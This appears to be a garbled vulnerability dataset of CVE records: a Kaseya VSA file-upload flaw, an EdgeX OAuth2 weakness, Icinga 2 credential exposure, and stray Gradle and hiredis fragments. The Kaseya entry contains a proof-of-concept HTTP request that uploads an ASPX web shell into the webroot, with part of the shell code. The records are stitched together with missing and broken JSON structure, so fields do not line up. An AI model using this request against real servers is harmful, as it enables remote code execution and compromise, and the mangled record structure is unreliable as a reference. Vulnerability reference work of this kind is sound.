{"CVE_ID": "CVE-2021-30118", "CVE_Description": "An attacker can upload files with the privilege of the Web Server process for Kaseya VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files to execute asp commands The api /SystemTab/uploader.aspx is vulnerable to an unauthenticated arbitrary file upload leading to RCE. An attacker can upload files with the privilege of the Web Server process and subsequently use these files to execute asp commands. Detailed description --- Given the following request: ``` POST /SystemTab/uploader.aspx?Filename=shellz.aspx&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=shellz.aspx HTTP/1.1 Host: 192.168.1.194 Cookie: sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219 Content-Length: 12 <%@ Page Language=\"C#\" Debug=\"true\" validateRequest=\"false\" %> <%@ Import namespace=\"System.Web.UI.WebControls\" %> <%@ Import namespace=\"System.Diagnostics\" %> <%@ Import namespace=\"System.IO\" %> <%@ Import namespace=\"System\" %> <%@ Import namespace=\"System.Data\" %> <%@ Import namespace=\"System.Data.SqlClient\" %> <%@ Import namespace=\"System.Security.AccessControl\" %> <%@ Import namespace=\"System.Security.Principal\" %> <%@ Import namespace=\"System.Collections.Generic\" %> <%@ Import namespace=\"System.Collections\" %> <script runat=\"server\"> private const string password = \"pass\"; // The password ( pass ) private const string style = \"dark\"; // The style ( light / dark ) protected void Page_Load(object sender, EventArgs e) { //this.Remote(password); this.Login(password); this.Style(); this.ServerInfo(); <snip> ``` The attacker can control the name of the file written via the qqfile parameter and the location of the file written via the PathData parameter. Even though the call requires that a sessionId cookie is passed we have determined that the sessionId is not actually validated and any numeric value is accepted as valid. Security issues discovered --- * a sessionId cookie is required by /SystemTab/uploader.aspx, but is not actually validated, allowing an attacker to bypass authentication * /SystemTab/uploader.aspx allows an attacker to create a file with arbitrary content in any place the webserver has write access * The web server process has write access to the webroot where the attacker can execute it by requesting the URL of the newly created file. Impact --- This arbitrary file upload allows an attacker to place files of his own choosing on any location on the hard drive of the server the webserver process has access to, including (but not limited to) the webroot. If the attacker uploads files with code to the webroot (e.g. aspx code) he can then execute this code in the context of the webserver to breach either the integrity, confidentiality, or availability of the system or to steal credentials of other users. In other words, this can lead to a full system compromise.", "CVE_Score": {"CNA:": "MITRE", "CNA:Base Score:": "9.8 CRITICAL", "Vector:": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}, "Reference": {"https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/": ["Patch", "Third Party Advisory"], "https://csirt.divd.nl/CVE-2021-30118": ["Exploit", "Third Party Advisory"], "https://csirt.divd.nl/DIVD-2021-00011": ["Patch", "Third Party Advisory"], "https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021": ["Release Notes", "Vendor Advisory"]}, "CWE": {"CWE-434": "Unrestricted Upload of File with Dangerous Type"}}

A vulnerability exists in the Edinburgh, Fuji, Geneva, and Hanoi versions of the software. When the EdgeX API gateway is configured for OAuth2 authentication and a proxy user is created, the client_id and client_secret required to obtain an OAuth2 authentication token are set to the username of the proxy user. A remote network attacker can then perform a dictionary-based password attack on the OAuth2 token endpoint of the API gateway to obtain an OAuth2 authentication token and use that token to make authenticated calls to EdgeX microservices from an untrusted network. OAuth2 is the default authentication method in EdgeX Edinburgh release. The default authentication method was changed to JWT in Fuji and later releases. Users should upgrade to the EdgeX Ireland release to obtain the fix. The OAuth2 authentication method is disabled in Ireland release.

In versions prior to 2.11.10 and from version 2.12.0 through version 2.12.4, some of the Icinga 2 features that require credentials for external services expose those credentials through the API to authenticated API users with read permissions for the corresponding object types. IdoMysqlConnection and IdoPgsqlConnection (every released version) exposes the password of the user used to connect to the database. IcingaDB (added in 2.12.0) exposes the password used to connect to the Redis server. ElasticsearchWriter (added in 2.8.0)exposes the password used to connect to the Elasticsearch server. An attacker who obtains these credentials can impersonate Icinga to these services and add, modify and delete information there. If credentials with more permissions are in use, this increases the impact accordingly. Starting with the 2.11.10 and 2.12.5 releases, these passwords are no longer exposed via the API. As a workaround, API user permissions can be restricted to not allow querying of any affected objects, either by explicitly listing only the required object types for object query permissions, or by applying a filter rule.", "CVE_Score": {"CNA:": "GitHub, Inc.", "CNA:Base Score:": "8.8 HIGH", "Vector:": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}, "Reference": {"https://github.com/Icinga/icinga2/security/advisories/GHSA-wrpw-pmr8-qgj7": ["Exploit", "Third Party Advisory"], "https://icinga.com/blog/2021/07/15/releasing-icinga-2-12-5-and-2-11-10/": ["Exploit", "Vendor Advisory"], "https://lists.debian.org/debian-lts-announce/2021/11/msg00010.html": ["Mailing List", "Third Party Advisory"]}, "CWE": {"CWE-202": "Exposure of Sensitive Information Through Data Queries"}}

For CI/CD systems using the Gradle build tool, one may ensure that untrusted users are unable to change environment variables for the user that executes `gradlew`. If one is unable to upgrade to Gradle 7.2, one may generate a new `gradlew` script with Gradle 7.2 and use it for older versions of Gradle.

This bug has been corrected in version 2.4.9 by performing argument interpolation only once, using the `hiredis` API.
